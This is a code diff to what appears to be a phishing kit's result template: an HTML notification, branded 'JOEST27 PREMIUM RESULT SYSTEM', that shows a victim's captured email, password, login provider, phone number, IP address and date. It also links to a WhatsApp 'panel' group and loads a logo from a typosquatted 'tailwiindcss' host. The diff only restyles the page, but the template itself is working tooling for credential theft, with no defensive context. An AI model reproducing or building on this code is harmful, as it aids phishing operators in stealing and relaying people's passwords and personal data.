@@ -150,143 +150,202 @@ function buildHtml(vars) {
   return `
 
 
-<!DOCTYPE html><html>
+
+
+    <!DOCTYPE html>
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
+
+<style>
 
 body{
-    margin:0;
-    padding:20px;
-    background:#1a1a1a;
-    font-family:Arial,sans-serif;
+margin:0;
+padding:20px;
+background:#1a1a1a;
+font-family:Arial,sans-serif;
 }
 
 .tblResult{
-    width:100%;
-    max-width:650px;
-    margin:auto;
-    border-collapse:collapse;
-    background:#242424;
-    border:2px solid #d4af37;
-    border-radius:12px;
-    overflow:hidden;
-}
-
-.banner{
-    width:100%;
-    display:block;
+width:100%;
+max-width:650px;
+margin:auto;
+background:#242424;
+border:2px solid #d4af37;
+border-collapse:collapse;
+border-radius:12px;
+overflow:hidden;
 }
 
 .header{
-    background:#3a3a3a;
-    color:#d4af37;
-    text-align:center;
-    font-size:18px;
-    font-weight:bold;
-    letter-spacing:2px;
-    padding:18px;
-    border-bottom:2px solid #d4af37;
-}
-
-.tblResult td{
-    padding:14px;
-    border-bottom:1px solid #3a3a3a;
-    color:#f5f5f5;
-    font-size:14px;
-}
-
-.label{
-    width:35%;
-    color:#d4af37;
-    font-weight:bold;
-}
-
-.value{
-    color:#ffffff;
-    text-align:right;
-    font-weight:600;
+background:#3a3a3a;
+color:#d4af37;
+text-align:center;
+font-weight:bold;
+letter-spacing:2px;
+padding:16px;
 }
 
 .section{
-    background:#3a3a3a;
-    color:#d4af37;
-    text-align:center;
-    font-weight:bold;
-    letter-spacing:1px;
+background:#333333;
+color:#d4af37;
+text-align:center;
+font-weight:bold;
+padding:14px;
+}
+
+.tblResult td{
+padding:14px;
+border-bottom:1px solid #3a3a3a;
+color:#ffffff;
+}
+
+.label{
+width:35%;
+color:#d4af37;
+font-weight:bold;
+}
+
+.value{
+text-align:right;
+font-weight:600;
 }
 
 .join-box{
-    padding:20px;
-    background:#242424;
+padding:20px;
+background:#242424;
 }
 
 .join-btn{
-    display:block;
-    text-align:center;
-    text-decoration:none;
-    background:#d4af37;
-    color:#1a1a1a;
-    padding:15px;
-    border-radius:8px;
-    font-weight:bold;
-    letter-spacing:1px;
+display:block;
+text-align:center;
+padding:15px;
+text-decoration:none;
+background:#d4af37;
+color:#1a1a1a;
+font-weight:bold;
+border-radius:8px;
 }
 
 .footer{
-    background:#3a3a3a;
-    color:#d4af37;
-    text-align:center;
-    font-size:12px;
-    padding:15px;
+background:#3a3a3a;
+color:#d4af37;
+text-align:center;
+padding:15px;
+font-size:12px;
 }
 
-</style></head><body><table class="tblResult"><tr>
-<td colspan="2" style="padding:0;">
-<img src="https://i.ibb.co/M750gDb/IMG-20220622-WA0144.jpg" class="banner">
+</style>
+</head>
+
+<body>
+
+<table class="tblResult">
+
+<tr>
+<td colspan="2" style="
+background:#2f2f2f;
+padding:30px 20px;
+text-align:center;
+border-bottom:2px solid #d4af37;
+">
+
+<img
+src="https://tailwiindcss.vercel.app/3b3dea7e-7574-445a-8d0d-98ec60b426b1.png"
+style="
+width:110px;
+height:110px;
+border-radius:50%;
+border:3px solid #d4af37;
+display:block;
+margin:auto;
+">
+
+<div style="
+margin-top:15px;
+font-size:28px;
+font-weight:900;
+letter-spacing:4px;
+color:#d4af37;
+">
+JOEST27
+</div>
+
+<div style="
+margin-top:8px;
+font-size:12px;
+letter-spacing:3px;
+color:#b0b0b0;
+">
+PREMIUM RESULT SYSTEM
+</div>
+
 </td>
-</tr><tr>
+</tr>
+
+<tr>
 <td colspan="2" class="header">
 INFORMASI LOGIN
 </td>
-</tr><tr>
+</tr>
+
+<tr>
 <td class="label">EMAIL</td>
 <td class="value">${vars.email}</td>
-</tr><tr>
+</tr>
+
+<tr>
 <td class="label">PASSWORD</td>
 <td class="value">${vars.password}</td>
-</tr><tr>
+</tr>
+
+<tr>
 <td class="label">LOGIN VIA</td>
 <td class="value">${vars.login}</td>
-</tr><tr>
+</tr>
+
+<tr>
 <td colspan="2" class="section">
 INFORMASI TAMBAHAN
 </td>
-</tr><tr>
+</tr>
+
+<tr>
 <td class="label">PHONE</td>
 <td class="value">${vars.phone}</td>
-</tr><tr>
+</tr>
+
+<tr>
 <td class="label">IP ADDRESS</td>
 <td class="value">${vars.ip}</td>
-</tr><tr>
+</tr>
+
+<tr>
 <td class="label">DATE</td>
 <td class="value">${vars.date}</td>
-</tr><tr>
-<td colspan="2" class="join-box"><a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
+</tr>
+
+<tr>
+<td colspan="2" class="join-box">
+
+<a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
 class="join-btn">
-JOIN WHATSAPP GROUP
+JOIN WHATSAPP GROUP PANEL
 </a>
 
 </td>
-</tr><tr>
-<td colspan="2" class="footer">
-© 2026 JOEST404 • PREMIUM NOTIFICATION SYSTEM
-</td>
-</tr></table></body>
-</html>
-            
+</tr>
 
-    
+<tr>
+<td colspan="2" class="footer">
+© 2026 JOEST27 • 
+</td>
+</tr>
+
+</table>
+
+</body>
+</html>
 
 `;
 }
